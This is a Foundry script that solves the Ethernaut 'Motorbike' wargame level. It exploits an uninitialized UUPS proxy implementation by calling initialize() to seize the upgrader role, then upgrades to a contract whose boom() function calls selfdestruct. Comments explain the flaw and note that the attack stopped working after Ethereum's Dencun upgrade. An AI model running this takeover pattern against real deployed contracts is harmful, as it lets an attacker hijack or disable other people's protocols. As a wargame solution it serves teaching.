// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

// $ source .env      # This is to store the environmental variables in the shell session
// $ forge script script/Motorbike.s.sol --tc MotorbikeSolution --rpc-url $SEPOLIA_RPC_URL --broadcast -vvvv --verify

// IMPORTANT: This solution is no longer valid after the Decun upgrade.
// The SELFDESTRUCT opcode no longer destroys the contract, unless it is in the same transaction as the creation of the contract.
// https://github.com/Ching367436/ethernaut-motorbike-solution-after-decun-upgrade/

interface engine {
    function upgrader() external view returns (address);
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external;
}

contract MotorbikeSolution is Script {

    // get the environmental variables
    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
    // this is the instance address created by the ethernaut contract
    address public instance = vm.envAddress("MOTORBIKE_INSTANCE");

    /*  
        The Motorbike contract is a proxy contract that delegates calls to the implementation contract.
        The Engine contract is the implementation that can be upgraded by the Motorbike contract.
        This is known as the UUPS proxy pattern. Where the upgrade is handle by the implementation contract.

        Notice that the Engine contract has a function upgradeToAndCall that calls functions of the new implementation base on the data[] passed to it.
        It has a function initialize that set the upgrader to make the future upgrade calls only by the upgrader.
        It is mean to be called by the motorbike contract, but if someone else calls it first it will gain control of the upgrade process.
        And if the attacker is malicious, it can upgrade the implementation to a contract that has a selfdestruct function, effectively making the protocol unusable.
        
        Notice that the upgrader is set on the Engine contract with the storage context of Motorbike since it is set during the constructor call of Motorbike with delegatecall.
        This is incorrect since any contract can call the initialize function of Engine and set itself as the upgrader on the Engine contract.
        This is a vulnerability that can be exploited by an attacker to take control of the upgrade process.

    */
    function run() external {
        vm.startBroadcast(deployerPrivateKey);
        // get the implementation address reading the storage slot of the instance
        bytes32 implementationSlot = vm.load(instance, 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc);
        address engineAddress = address(uint160(uint256(implementationSlot)));
        engine engineContract = engine(engineAddress);
        // create a new contract that has a selfdestruct function
        selfdestructContract attackerContract = new selfdestructContract();

        console.log("Upgrader address: ", engineContract.upgrader());

        // call the initialize function of the Engine contract to set the upgrader to ourselves
        engineContract.initialize();
        console.log("Upgrader address after initialization: ", engineContract.upgrader());

        // call the upgradeToAndCall function of the Engine contract to upgrade the implementation to a contract that has a selfdestruct function
        engineContract.upgradeToAndCall(address(attackerContract), abi.encodeWithSignature("boom()"));

        vm.stopBroadcast();
    }
}

contract selfdestructContract {

    function boom() public {
        selfdestruct(payable(tx.origin));
    }
}